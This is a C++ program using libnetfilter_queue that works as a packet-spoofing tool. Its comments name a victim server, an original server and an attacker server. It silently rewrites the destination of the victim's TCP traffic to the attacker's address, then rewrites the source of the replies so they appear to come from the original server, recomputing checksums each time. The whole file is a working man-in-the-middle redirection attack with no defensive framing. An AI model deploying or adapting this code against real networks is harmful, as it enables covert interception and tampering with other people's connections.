#include <cstdio>
#include <cerrno>
#include <stdexcept>
#include <cstring>
#include <memory>
#include <functional>
#include <array>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <linux/netfilter.h>
  
extern "C"
{
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <libnetfilter_queue/pktbuff.h>
#include <libnetfilter_queue/libnetfilter_queue_ipv4.h>
#include <libnetfilter_queue/libnetfilter_queue_tcp.h>
}
  
#define THROW_IF_TRUE(x, m) do { if((x)) { throw std::runtime_error(m); }} while(false)
  
#define CONCAT_0(pre, post) pre ## post
#define CONCAT_1(pre, post) CONCAT_0(pre, post)
#define GENERATE_IDENTIFICATOR(pre) CONCAT_1(pre, __LINE__)
  
using ScopedGuard = std::unique_ptr<void, std::function<void(void *)>>;
#define SCOPED_GUARD_NAMED(name, code) ScopedGuard name(reinterpret_cast<void *>(-1), [&](void *) -> void {code}); (void)name
#define SCOPED_GUARD(code) SCOPED_GUARD_NAMED(GENERATE_IDENTIFICATOR(genScopedGuard), code)

static unsigned short compute_checksum(unsigned short *addr, unsigned int count) {
	register unsigned long sum = 0;
	while (count > 1) {
	sum += * addr++;
	count -= 2;
	}
	//if any bytes left, pad the bytes and add
	if(count > 0) {
	sum += ((*addr)&htons(0xFF00));
	}
	//Fold sum to 16 bits: add carrier to result
	while (sum>>16) {
	  sum = (sum & 0xffff) + (sum >> 16);
	}
	//one's complement
	sum = ~sum;
	return ((unsigned short)sum);
}

static int callback(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
	      struct nfq_data *nfad, void *data)
{
	struct nfqnl_msg_packet_hdr *ph = nfq_get_msg_packet_hdr(nfad);
	THROW_IF_TRUE(ph == nullptr, "Issue while packet header");
  
	unsigned char *rawData = nullptr;
	int len = nfq_get_payload(nfad, &rawData);
	THROW_IF_TRUE(len < 0, "Can\'t get payload data");
  
	struct pkt_buff * pkBuff = pktb_alloc(AF_INET, rawData, len, 0x1000);
	THROW_IF_TRUE(pkBuff == nullptr, "Issue while pktb allocate");
	SCOPED_GUARD( pktb_free(pkBuff); ); // Don't forget to clean up
  
	struct iphdr *ip = nfq_ip_get_hdr(pkBuff);
	THROW_IF_TRUE(ip == nullptr, "Issue while ipv4 header parse.");
  
	THROW_IF_TRUE(nfq_ip_set_transport_header(pkBuff, ip) < 0, "Can\'t set transport header.");
	
	// Request Packet Spoofing
	// 0x6539b436 is Original Server, 0xec2da8c0 is Victim Server
	if(ip->protocol == IPPROTO_TCP && ip->daddr==0x6539b436 && ip->saddr==0xec2da8c0){
		struct tcphdr *tcp = nfq_tcp_get_hdr(pkBuff);
		THROW_IF_TRUE(tcp == nullptr, "Issue while tcp header.");
		// ip->daddr is Destination IP, Spoofing IP
		// 0xce0a1568 is Attacker Server
		ip->daddr = 0xce0a1568;
		
		// Calculate ip Checksum 
		ip->check = 0;
		ip->check = compute_checksum((unsigned short*)ip,ip->ihl<<2);
		printf("Spoofing %x %x\n", htonl(ip->saddr),htonl(ip->daddr));
		  
		nfq_tcp_compute_checksum_ipv4(tcp, ip);
		return nfq_set_verdict(qh, ntohl(ph->packet_id), NF_ACCEPT, pktb_len(pkBuff), pktb_data(pkBuff));
	}
	// Response Packet Spoofing
	// 0xce0a1568 is Attacker Server
	else if(ip->protocol == IPPROTO_TCP && ip->saddr==0xce0a1568){
		struct tcphdr *tcp = nfq_tcp_get_hdr(pkBuff);
		THROW_IF_TRUE(tcp == nullptr, "Issue while tcp header.");
		
		// 0x6539b436 is Original Server, Need to Change Spoofing IP to Original Source IP
		ip->saddr = 0x6539b436;
		
		// Calculate ip Checksum 
		ip->check = 0;
		ip->check = compute_checksum((unsigned short*)ip,ip->ihl<<2);
		printf("Response %x %x\n", htonl(ip->saddr),htonl(ip->daddr));
		  
		nfq_tcp_compute_checksum_ipv4(tcp, ip);
		return nfq_set_verdict(qh, ntohl(ph->packet_id), NF_ACCEPT, pktb_len(pkBuff), pktb_data(pkBuff));
	}
	return nfq_set_verdict(qh, ntohl(ph->packet_id), NF_ACCEPT, 0, NULL);
}


int main(int argc, char **argv)
{

	struct nfq_handle *h;
	struct nfq_q_handle *qh;
	struct nfnl_handle *nh;
	int fd;
	int rv;
	char buf[4096] __attribute__ ((aligned));

	h = nfq_open();

	if (!h) {
		fprintf(stderr, "error during nfq_open()\n");
		exit(1);
	}

	if (nfq_unbind_pf(h, AF_INET) < 0) {
		fprintf(stderr, "error during nfq_unbind_pf()\n");
		exit(1);
	}

	if (nfq_bind_pf(h, AF_INET) < 0) {
		fprintf(stderr, "error during nfq_bind_pf()\n");
		exit(1);
	}

	// Intercept Packet
	qh = nfq_create_queue(h,  0, &callback, NULL);

	if (!qh) {
		fprintf(stderr, "error during nfq_create_queue()\n");
		exit(1);
	}

	// NFQNL_COPY_PACKET is "copy entire packet"
	if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
		fprintf(stderr, "can't set packet_copy mode\n");
		exit(1);
	}

	fd = nfq_fd(h);

	for (;;) {
		if ((rv = recv(fd, buf, sizeof(buf), 0)) >= 0) {
			nfq_handle_packet(h, buf, rv);
			continue;
		}

		/* if your application is too slow to digest the packets that
		 * are sent from kernel-space, the socket buffer that we use
		 * to enqueue packets may fill up returning ENOBUFS. Depending
		 * on your application, this error may be ignored. Please, see
		 * the doxygen documentation of this library on how to improve
		 * this situation.
		 */

		if (rv < 0 && errno == ENOBUFS) {
			printf("losing packets!\n");
			continue;
		}

		perror("recv failed");
		break;
	}

	nfq_destroy_queue(qh);


#ifdef INSANE
	/* normally, applications SHOULD NOT issue this command, since
	 * it detaches other programs/sockets from AF_INET, too ! */

	printf("unbinding from AF_INET\n");
	nfq_unbind_pf(h, AF_INET);

#endif
	printf("closing library handle\n");
	nfq_close(h);

	exit(0);
}
